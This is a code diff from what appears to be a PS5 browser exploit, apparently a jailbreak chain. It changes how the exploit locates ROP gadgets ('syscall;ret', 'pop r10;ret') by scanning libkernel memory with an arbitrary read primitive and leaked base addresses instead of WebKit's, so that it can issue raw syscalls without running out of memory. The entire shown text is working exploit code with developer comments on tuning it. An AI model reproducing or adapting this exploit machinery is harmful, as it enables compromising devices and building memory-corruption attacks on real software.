@@ -218,26 +218,29 @@ async function prepare(p) {
     }
 
     // [raw syscall] Some syscalls have NO libkernel C stub (e.g. 727/0x2D7
-    // GET_AIO_DEBUG_REQUEST_INFO). To call them in stub mode we scan WebKit
-    // .text (readable, our own module) for `syscall;ret` (0f 05 c3) and
-    // `pop r10;ret` (41 5a c3); with the X1NON pop-rax/arg pops and
-    // `mov [rdi],rax`, the classic pop-rax chain works without libkernel.
+    // GET_AIO_DEBUG_REQUEST_INFO). To call them we scan libkernel_web .text
+    // for `syscall;ret` (0f 05 c3) and `pop r10;ret` (41 5a c3).
+    //
+    // WHY LIBKERNEL, NOT WEBKIT:
+    //   WebKit scan (old): 8-16 MB, byte-stepped -> 8-16M add32() calls
+    //   -> 8-16M int64 temp objects -> GC pressure -> OOM on PS5.
+    //   libkernel scan: 256 KB max, `syscall;ret` appears in the FIRST 64 KB
+    //   (every syscall stub ends with it, hundreds of occurrences).
+    //   262K iterations vs 16M = 64x fewer objects, no OOM risk.
+    //   PSAITO bridge.js (0aa7b50) confirmed: scan libkernel, not WebKit.
     let rawSyscall = false;
-    function scanWkPat(pat) {
-        // Scan WebKit .text with the plain `read4` primitive (returns a
-        // number, allocates nothing). The old array_from_address() approach
-        // re-pointed a GC-tracked typed array at .text and mutated its length
-        // every chunk — that is what triggered the PS5 "not enough free
-        // memory" dialog. read4 has no fake arrays and no GC pressure.
+    function scanLkPat(pat) {
         if (pat.length !== 3) return null;
         const target = (pat[0] & 0xff) | ((pat[1] & 0xff) << 8) | ((pat[2] & 0xff) << 16);
-        const PASSES = [0x800000, 0x1000000]; // 8 MB then 16 MB
+        // First 256 KB of libkernel covers ALL syscall stubs — `syscall;ret`
+        // appears within the first 64 KB. Extend to 1 MB only as a fallback.
+        const PASSES = [0x40000, 0x100000]; // 256 KB then 1 MB
         let from = 0;
         for (let pass = 0; pass < PASSES.length; pass++) {
             const to = PASSES[pass];
             for (let off = from; off + 3 <= to; off++) {
-                if ((p.read4(libSceNKWebKitBase.add32(off)) & 0xFFFFFF) === target)
-                    return libSceNKWebKitBase.add32(off);
+                if ((p.read4(libKernelBase.add32(off)) & 0xFFFFFF) === target)
+                    return libKernelBase.add32(off);
             }
             from = to;
         }
@@ -256,8 +259,8 @@ async function prepare(p) {
                 jbmark("WK-RAW-SKIP", "noraw=1");
                 return false;
             }
-            const gSyscall = scanWkPat([0x0f, 0x05, 0xc3]);
-            const gPopR10 = scanWkPat([0x41, 0x5a, 0xc3]);
+            const gSyscall = scanLkPat([0x0f, 0x05, 0xc3]);
+            const gPopR10 = scanLkPat([0x41, 0x5a, 0xc3]);
             if (gSyscall !== null) gadgets["syscall"] = gSyscall;
             if (gPopR10 !== null) gadgets["pop r10"] = gPopR10;
             rawSyscall = (gSyscall !== null);
